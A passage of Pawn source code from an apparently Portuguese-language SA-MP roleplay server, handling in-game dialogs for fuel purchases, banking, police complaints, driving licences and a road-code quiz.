		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE NEGÓCIOS", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto sobre negócios.", "Escolher", "Sair");
		    
            new montante = strval(inputtext);

            if(montante < 0 || montante > 100) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE NEGÓCIOS", "{FF0000}Valor inválido (0-100). {FFFFFF}Introduz o montante para o imposto sobre negócios.", "Escolher", "Sair");

			oInfo[0][ImpostoLojas] = montante;
			GuardarOutros();

			format(string, sizeof(string), "Alteraste o imposto sobre negócios para %d$.", montante);
			SendClientMessage(playerid, COLOR_INFO, string);

		    return 1;
		}
		case DIALOG_ATESTAR:
		{
		    if(!response) return 1;
		    
		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Valor inválido. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Valor inválido. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
		    
            new litros = strval(inputtext);

			new gasid = IsAtGasStation(playerid);
			new car = GetPlayerVehicleID(car);

            if(litros <= 0 || litros > 100) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Valor inválido. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
			if(litros + cInfo[car][Gasolina] > 100) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Com esse valor ultrapassas os 100L. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
			
			new custo = litros * oInfo[0][PrecoAtestarG];
			
			format(string, sizeof(string), "{FF0000}Não tens %d$. {FFFFFF}Introduz quantos litros queres atestar.", custo);
			
			if(GetPlayerMoneyEx(playerid) < custo) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", string, "Escolher", "Sair");
			
            format(string, sizeof(string), "Atestaste o teu veículo com %d litros. Custo: %d$", litros, custo);
            SendClientMessage(playerid, COLOR_INFO, string);
            
            GivePlayerMoneyEx(playerid, -custo);
            bInfo[gasid][Bank] += custo;
            cInfo[car][Gasolina] += litros;
            
			for(new i = 0; i < MAX_FACTIONS; i++)
			{
			    if(fInfo[i][Type] != F_GOVERNO) continue;

			    fInfo[i][Bank] += custo;
				break;
			}
            
            PlayerActionMessage(playerid, 15.0, "atesta o seu veículo.");
            
            return 1;
		}
		case DIALOG_BANCO_MENU:
		{
		    if(!response) return 1;
		    
			switch(listitem)
			{
				case 0:
				{
					return ShowPlayerDialog(playerid, DIALOG_BANCO_DEPOSITAR, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar
				}
				case 1:
				{
				    return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair
				}
				case 2:
				{
				    format(string, sizeof(string), "[BANCO:] {FFFFFF}Montante no banco: %d$", pInfo[playerid][Bank]);
				    SendClientMessage(playerid, COLOR_CHAT, string);
				    
				    PlayerActionMessage(playerid, 15.0, "recebe um papel com informação bancária.");
				}
				case 3:
				{
				    return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FFFFFF}Introduz a conta bancária para onde deseja transferir dinheiro. (( playerid ))", "Escolher", "Sair"); // Transferir
				}
				case 4:
				{
				    return ShowPlayerDialog(playerid, DIALOG_BANCO_TEL, DIALOG_STYLE_INPUT, "{FFFF00}CARREGAR TELEMÓVEL", "{FFFFFF}Introduz o montante que deseja carregar no seu telemóvel.", "Escolher", "Sair"); // carregar telemóvel
				}
				case 5:
				{
				    if(pInfo[playerid][LicPesca] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma Licença de Pesca");
				    if(GetPlayerMoneyEx(playerid) < PRECO_LICPESCA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    
				    GivePlayerMoneyEx(playerid, -PRECO_LICPESCA);
				    pInfo[playerid][LicPesca] = 1;
				    
		 			SendClientMessage(playerid, COLOR_INFO, "Compraste uma licença de pesca");

					PlayerActionMessage(playerid, 15.0, "recebe um talão com a sua licença de pescador.");
				}
				case 6:
				{
				    format(string, sizeof(string), "[BANCO:] {FFFFFF}Montante no banco da faction: %d$", fInfo[pInfo[playerid][Faction]][Bank]);
				    SendClientMessage(playerid, COLOR_CHAT, string);

				    PlayerActionMessage(playerid, 15.0, "recebe um papel com informação bancária.");
				}
				case 7:
				{
					return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR_F, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FFFFFF}Introduz o montante que deseja extrair do banco da faction.", "Escolher", "Sair"); // Extrair
				}
				case 8:
				{
                    return ShowPlayerDialog(playerid, DIALOG_BANCO_MENU_F, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar
				}
			}
			
			return 1;
		}
		case DIALOG_BANCO_MENU_F:
		{
		    if(!response) return 1;

  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_MENU_F, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar

            new montante = strval(inputtext);

            if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_MENU_F, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar
            if(GetPlayerMoneyEx(playerid) < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_MENU_F, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar

			fInfo[pInfo[playerid][Faction]][Bank] += montante;
			GivePlayerMoneyEx(playerid, -montante);

   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Depositaste %d$ no banco da faction. Novo balanço: %d$", montante, fInfo[pInfo[playerid][Faction]][Bank]);
		 	SendClientMessage(playerid, COLOR_CHAT, string);

			PlayerActionMessage(playerid, 15.0, "dá algum dinheiro ao banqueiro.");

			return 1;
		}
		case DIALOG_BANCO_DEPOSITAR:
		{
		    if(!response) return 1;

  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_DEPOSITAR, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar

            new montante = strval(inputtext);

            if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_DEPOSITAR, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar
            if(GetPlayerMoneyEx(playerid) < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_DEPOSITAR, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar

			pInfo[playerid][Bank] += montante;
			GivePlayerMoneyEx(playerid, -montante);
			
   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Depositaste %d$ no banco. Novo balanço: %d$", montante, pInfo[playerid][Bank]);
		 	SendClientMessage(playerid, COLOR_CHAT, string);
		 	
			PlayerActionMessage(playerid, 15.0, "dá algum dinheiro ao banqueiro.");
			
			return 1;
		}
		case DIALOG_BANCO_TEL:
		{
		    if(!response) return 1;

  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_TEL, DIALOG_STYLE_INPUT, "{FFFF00}CARREGAR TELEMÓVEL", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja carregar no seu telemóvel.", "Escolher", "Sair"); // Depositar

            new montante = strval(inputtext);

            if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_TEL, DIALOG_STYLE_INPUT, "{FFFF00}CARREGAR TELEMÓVEL", "{FF0000}Nice try ;). {FFFFFF}Introduz o montante que deseja carregar no seu telemóvel.", "Escolher", "Sair"); // Depositar
            if(GetPlayerMoneyEx(playerid) < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_TEL, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja carregar no seu telemóvel.", "Escolher", "Sair"); // Depositar

			GivePlayerMoneyEx(playerid, -montante);
			pInfo[playerid][Saldo] += montante;
			bInfo[pInfo[playerid][Rede]][Bank] += montante;

   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Carregaste o teu telemóvel com %d$. Saldo atual: %d$", montante, pInfo[playerid][Saldo]);
		 	SendClientMessage(playerid, COLOR_CHAT, string);

			PlayerActionMessage(playerid, 15.0, "dá algum dinheiro ao banqueiro.");

			return 1;
		}
		case DIALOG_BANCO_EXTRAIR:
		{
		    if(!response) return 1;
		    
  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair

            new montante = strval(inputtext);
            
            if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair
            if(pInfo[playerid][Bank] < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Não tens esse dinheiro. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair

			pInfo[playerid][Bank] -= montante;
			GivePlayerMoneyEx(playerid, montante);
			
   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Extraiste %d$ do banco. Novo balanço: %d$", montante, pInfo[playerid][Bank]);
		 	SendClientMessage(playerid, COLOR_CHAT, string);
		 	
		 	PlayerActionMessage(playerid, 15.0, "recebe algum dinheiro do banqueiro.");
		 	
		 	return 1;
		}
		case DIALOG_BANCO_EXTRAIR_F:
		{
		    if(!response) return 1;

  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR_F, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair do banco da faction.", "Escolher", "Sair"); // Extrair

            new montante = strval(inputtext);

            if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR_F, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair do banco da faction.", "Escolher", "Sair"); // Extrair
            if(fInfo[pInfo[playerid][Faction]][Bank] < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR_F, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}A faction não tem esse dinheiro. {FFFFFF}Introduz o montante que deseja extrair do banco da faction.", "Escolher", "Sair"); // Extrair

			fInfo[pInfo[playerid][Faction]][Bank] -= montante;
			GivePlayerMoneyEx(playerid, montante);

   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Extraiste %d$ do banco da faction. Novo balanço: %d$", montante, fInfo[pInfo[playerid][Faction]][Bank]);
		 	SendClientMessage(playerid, COLOR_CHAT, string);

		 	PlayerActionMessage(playerid, 15.0, "recebe algum dinheiro do banqueiro.");

		 	return 1;
		}
		case DIALOG_BANCO_TRANSF:
		{
		    if(!response) return 1;
		    
  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}ID inválido. {FFFFFF}Introduz a conta bancária para onde deseja transferir dinheiro. (( playerid ))", "Escolher", "Sair"); // Transferir

            new giveplayerid = strval(inputtext);
            
            TransferirPara[playerid] = giveplayerid;
            
			if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
			if(GetPlayerScore(giveplayerid) < 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível insuficiente");
			
			return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir
		}
		case DIALOG_BANCO_TRANSF2:
		{
		    if(!response) return 1;

  		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir

            new montante = strval(inputtext);
            
            if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir
            if(pInfo[playerid][Bank] < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}Não tens esse dinheiro. {FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir

			pInfo[playerid][Bank] -= montante;
			pInfo[TransferirPara[playerid]][Bank] += montante;
			
   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Transferiste %d$ para a conta bancária de: %s. Novo balanço: %d$", montante, GetPlayerNameEx(TransferirPara[playerid]), pInfo[playerid][Bank]);
		 	SendClientMessage(playerid, COLOR_CHAT, string);
		 	
   			format(string, sizeof(string), "[BANCO:] {FFFFFF}Recebeste uma transferência de %d$ do jogador %s. Novo balanço: %d$", montante, GetPlayerNameEx(playerid), pInfo[TransferirPara[playerid]][Bank]);
		 	SendClientMessage(TransferirPara[playerid], COLOR_CHAT, string);
		 	
			PlayerActionMessage(playerid, 15.0, "clica no botão e autoriza a transferência.");
			
			TransferirPara[playerid] = 0;
			
			return 1;
		}
		case DIALOG_PSP_MENU:
		{
		    if(!response) return 1;
		    
		    switch(listitem)
		    {
		        case 0: // chamar agente
		        {
          			foreach(new i : Player)
				    {
        				// if(!IsPlayerConnected(i)) continue;
        				if(pInfo[i][Faction] == 0) continue;
        				if(fInfo[pInfo[i][Faction]][Type] != F_POLICIA) continue;
        				if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) continue;

				        SendClientMessage(i, 0x4F7EFFAA, "[ESQUADRA:] {FFFFFF}Está um cidadão a chamar um agente na esquadra da PSP!");
				    }
				    SendClientMessage(playerid, COLOR_INFO, "Todos os agentes em serviço receberam o seu pedido. Aguarde.");
		        }
		        case 1: // apresentar queixa
		        {
					ShowPlayerDialog(playerid, DIALOG_PSP_QUEIXA, DIALOG_STYLE_INPUT, "{FFFF00}QUEIXAS", "{FFFFFF}Escreve aqui a tua queixa.", "Enviar", "Sair");
		        }
		    }
		    
		    return 1;
		}
		case DIALOG_PSP_QUEIXA:
		{
		    if(!response) return 1;
		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_PSP_QUEIXA, DIALOG_STYLE_INPUT, "{FFFF00}QUEIXAS", "{FF0000}Queixa inválida. {FFFFFF}Escreve aqui a tua queixa.", "Enviar", "Sair");
		    
		    format(string, sizeof(string), "[ESQUADRA:] {FFFFFF}O cidadão %s apresentou a queixa: %s", GetPlayerNameEx(playerid), inputtext);
   			foreach(new i : Player)
			{
				// if(!IsPlayerConnected(i)) continue;
				if(pInfo[i][Faction] == 0) continue;
				if(fInfo[pInfo[i][Faction]][Type] != F_POLICIA) continue;
				if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) continue;

				SendClientMessage(i, 0x4F7EFFAA, string);
			}
			format(string, sizeof(string), "[ESQUADRA:] {FFFFFF}Enviaste a queixa: %s", inputtext);
			SendClientMessage(playerid, 0x4F7EFFAA, string);
			
			return 1;
		}
		case DIALOG_CM:
		{
		    if(!response) return 1;

		    switch(listitem)
		    {
		        case 0: // comprar CC
		        {
					if(pInfo[playerid][CC] != -1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Cartão de Cidadão!");
					if(GetPlayerMoneyEx(playerid) < 500) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
					
					GivePlayerMoneyEx(playerid, -500);
					
					pInfo[playerid][CC] = pInfo[playerid][UID];
					SendClientMessage(playerid, COLOR_INFO, "Compraste o teu Cartão de Cidadão com sucesso!");
		        }
		        case 1: // comprar escritura
		        {
					//ShowPlayerDialog(playerid, DIALOG_PSP_QUEIXA, DIALOG_STYLE_INPUT, "{FFFF00}QUEIXAS", "{FFFFFF}Escreve aqui a tua queixa.", "Enviar", "Sair");
		        }
		    }
		    
		    return 1;
		}
		case DIALOG_LICENCAS:
		{
		    if(!response) return 1;
		    
		    switch(listitem)
		    {
				case 0: // código
				{
				    if(GetPlayerMoneyEx(playerid) < PRECO_CODIGO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    if(pInfo[playerid][Codigo] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens o Código da Estrada");
				    
				    GivePlayerMoneyEx(playerid, -PRECO_CODIGO);
				    
					format(string, sizeof(string), "{FFFFFF}Bem Vindo é tua aula do {00FF00}Código da Estrada{FFFFFF}. {FF0000}Lê atentamente{FFFFFF}, pois vais ter de passar um teste."); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FFFFFF}Uma das principais regras de trânsito é nunca ultrapassar mais de 2 carros seguidos."); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FFFFFF}Para efectuar qualquer ultrapassagem utilize os piscas."); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FFFFFF}Não conduza sobre efeito do álcool ou estupefacientes."); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FFFFFF}Deve dar sempre prioridade a veículos da polícia e do hospital que circulem assinalando correctamente a marcha de urgência"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FFFFFF}Limites de velocidade: 55 KM/h nas localidades - 90 KM/h fora das localidades - 130 KM/h nas autoestradas."); strcat(sdialog,string);

					ShowPlayerDialog(playerid, DIALOG_CODIGO, DIALOG_STYLE_MSGBOX, "{FFFF00}AULA DE CÓDIGO", sdialog, "Questionário", "Sair");
				}
				case 1: // ligeiros
				{
				    if(GetPlayerMoneyEx(playerid) < PRECO_LIGEIROS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    if(pInfo[playerid][CartaLig] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Ligeiros");
					if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");
				    
				    GivePlayerMoneyEx(playerid, -PRECO_LIGEIROS);
				    
				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no carro que está nas traseiras da escola. Não passes dos limites nem batas com o carro. Boa sorte!");
				    
				    ATirarCartaLigeiro[playerid] = true;
				    RotaConducao[playerid] = 2;
				    
				    SetPlayerCheckpoint(playerid, 1427.395263, -1604.442871, 13.109894, 5.0);
				}
				case 2: // pesados
				{
				    if(GetPlayerMoneyEx(playerid) < PRECO_PESADOS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    if(pInfo[playerid][CartaPesados] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Pesados");
					if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");
				    
				    GivePlayerMoneyEx(playerid, -PRECO_PESADOS);

				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no carro que está nas traseiras da escola. Não passes dos limites nem batas com o camião. Boa sorte!");

				    ATirarCartaPesados[playerid] = true;
				    RotaConducao[playerid] = 2;
				    
				    SetPlayerCheckpoint(playerid, 1427.395263, -1604.442871, 13.109894, 5.0);
				}
				case 3: // motas
				{
				    if(GetPlayerMoneyEx(playerid) < PRECO_MOTAS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    if(pInfo[playerid][CartaMota] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Motociclos");
    				if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");
				    
				    GivePlayerMoneyEx(playerid, -PRECO_MOTAS);

				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no carro que está nas traseiras da escola. Não passes dos limites nem batas com a mota. Boa sorte!");

				    ATirarCartaMota[playerid] = true;
				    RotaConducao[playerid] = 2;
				    
				    SetPlayerCheckpoint(playerid, 1427.395263, -1604.442871, 13.109894, 5.0);
				}
				case 4:
				{
				    if(GetPlayerMoneyEx(playerid) < PRECO_BARCO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    if(pInfo[playerid][CartaBarco] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens Carta de Barco");
				    if(pInfo[playerid][Codigo] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens o código!");

				    GivePlayerMoneyEx(playerid, -PRECO_BARCO);

				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Entra no barco que está no cais. Não batas com o barco. Boa sorte!");

				    ATirarCartaBarco[playerid] = true;
				    RotaConducao[playerid] = 2;

				    SetPlayerCheckpoint(playerid, 113.569793, -1808.766845, -0.266756, 5.0);
				}
			}
			
			return 1;
		}
		case DIALOG_CODIGO:
		{
		    if(!response) return 1;
		    
			format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quantos carros posso ultrapassar de seguida no máximo?"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}2"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}1"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}3"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{FF9900}Nenhuma das anteriores"); strcat(sdialog,string);

			return ShowPlayerDialog(playerid, DIALOG_CODIGO1, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		}
		case DIALOG_CODIGO1:
		{
		    if(!response)
		    {
				format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quantos carros posso ultrapassar de seguida no máximo?"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}2"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}1"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}3"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}Nenhuma das anteriores"); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_CODIGO1, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		    }
		    
		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quantos carros posso ultrapassar de seguida no máximo?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}2"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}1"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}3"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Nenhuma das anteriores"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_CODIGO1, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		        }
		        case 1: // certa
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quais os limites de velocidade que estão certos?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}60 KM/h Localidades - 90 KM/h Fora das Localidades - 120 KM/h Autoestradas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}45 KM/h Localidades - 100 KM/h Fora das Localidades - 130 KM/h Autoestradas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}50 KM/h Localidades - 90 KM/h Fora das Localidades - 30 KM/h Autoestradas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Nenhuma das anteriores"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_CODIGO2, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		        }
		        case 2:
		        {
		            return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
		        }
		        case 3:
		        {
		            return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
		        }
		        case 4:
		        {
		            return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
		        }
		    }
		}
		case DIALOG_CODIGO2:
		{
		    if(!response)
		    {
				format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quais os limites de velocidade que estão certos?"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}60 KM/h Localidades - 90 KM/h Fora das Localidades - 120 KM/h Autoestradas"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}45 KM/h Localidades - 100 KM/h Fora das Localidades - 130 KM/h Autoestradas"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}50 KM/h Localidades - 90 KM/h Fora das Localidades - 30 KM/h Autoestradas"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}Nenhuma das anteriores"); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_CODIGO2, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		    }
		    
		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Quais os limites de velocidade que estão certos?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}60 KM/h Localidades - 90 KM/h Fora das Localidades - 120 KM/h Autoestradas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}45 KM/h Localidades - 100 KM/h Fora das Localidades - 130 KM/h Autoestradas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}50 KM/h Localidades - 90 KM/h Fora das Localidades - 30 KM/h Autoestradas"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Nenhuma das anteriores"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_CODIGO2, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		        }
		        case 1:
		        {
		            return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
		        }
		        case 2:
		        {
		            return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
		        }
		        case 3:
		        {
		            return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
		        }
		        case 4: // certa
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}A que carros devo dar prioridade?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os carros da polícia e hospital"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os veículos de emergência"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os veículos com os 4 piscas ligados"); strcat(sdialog,string);
